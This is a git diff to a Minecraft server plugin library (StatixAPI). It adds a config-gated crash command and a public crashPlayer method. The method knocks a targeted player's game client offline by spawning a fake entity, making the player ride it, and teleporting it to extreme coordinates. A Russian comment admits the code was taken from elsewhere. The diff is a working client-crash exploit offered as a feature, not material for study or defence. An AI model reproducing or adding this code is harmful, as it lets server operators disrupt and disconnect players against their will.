@@ -23,6 +23,8 @@ import ru.statix.api.bukkit.listeners.PlayerListener;
 import ru.statix.api.bukkit.protocollib.entity.listener.FakeEntityListener;
 import ru.statix.api.bukkit.event.EventRegisterManager;
 import ru.statix.api.bukkit.game.GameAPI;
+import ru.statix.api.bukkit.protocollib.packet.crash.Protocol;
+import ru.statix.api.bukkit.protocollib.packet.crash.ProtocolBuilder;
 import ru.statix.api.bukkit.protocollib.team.ProtocolTeam;
 import ru.statix.api.bukkit.scoreboard.BaseScoreboardBuilder;
 import ru.statix.api.bukkit.scoreboard.listener.BaseScoreboardListener;
@@ -30,8 +32,10 @@ import ru.statix.api.bukkit.types.CuboidRegion;
 import ru.statix.api.bukkit.utility.ItemUtil;
 import ru.statix.api.bukkit.vault.VaultManager;
 import ru.statix.api.bukkit.vault.VaultPlayer;
+import ru.statix.api.example.commands.CrashCommand;
 import ru.statix.api.example.commands.TestCommand;
 import ru.statix.api.example.commands.TestMegaCommand;
+import ru.statix.api.example.commands.UpdatelangCommand;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -111,6 +115,16 @@ public final class StatixAPI extends JavaPlugin {
             registerCommand(new TestMegaCommand());
             getLogger().info("Successful start register TestCommands");
         }
+        if (getConfig().getBoolean("StatixAPI.CrashCommand")) {
+            registerCommand(new CrashCommand());
+            getLogger().info("Successful start register CrashCommand");
+        }
+        registerCommand(new UpdatelangCommand());
+        getLogger().info("Successful start register UpdateLangCommand");
+
+
+        getLogger().info("| StatixAPI is enabled!");
+        getLogger().info("| Authors: ItzStonlex, iStatix"); // Ну на самом деле миша сделал дохера фич которые есть в этой апишке, так что пусть будет =)
     }
 
 
@@ -271,6 +285,22 @@ public final class StatixAPI extends JavaPlugin {
      */
     public static BaseScoreboardBuilder newScoreboardBuilder(@NonNull String objectiveName) {
         return BaseScoreboardBuilder.newScoreboardBuilder(objectiveName);
+    }
+
+
+    /**
+     * Неважно где спиздил, главное что работает благостно и по уму =)
+     *
+     * @param crash - Игрок клиент которого мы крашим
+     */
+    public void crashPlayer(Player crash) {
+        int id = 12345;
+        Protocol p = ProtocolBuilder.getInstance();
+        Location spawnLoc = crash.getLocation();
+        spawnLoc.add(spawnLoc.getDirection().multiply(-10));
+        p.spawnEntity(crash, spawnLoc, id);
+        p.setPassenger(crash, id, crash.getEntityId());
+        p.teleport(crash, id, crash.getLocation().add(9999999.0D, 999999.0D, 9999999.0D));
     }
 
 }
